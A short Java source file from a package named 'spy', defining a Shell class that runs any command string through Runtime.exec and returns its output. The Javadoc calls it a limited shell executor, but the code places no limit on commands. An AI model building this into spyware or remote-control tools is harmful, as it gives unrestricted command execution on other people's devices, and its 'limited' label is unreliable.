package ai.m4zk1play.spy;

import java.io.BufferedReader;
import java.io.InputStreamReader;

/** Eksekutor shell terbatas. */
public final class Shell {
    public static String exec(String cmd) {
        StringBuilder sb = new StringBuilder();
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                while ((line = r.readLine()) != null) sb.append(line).append('\n');
            }
        } catch (Exception e) {
            sb.append("err: ").append(e.getMessage());
        }
        return sb.toString();
    }
}
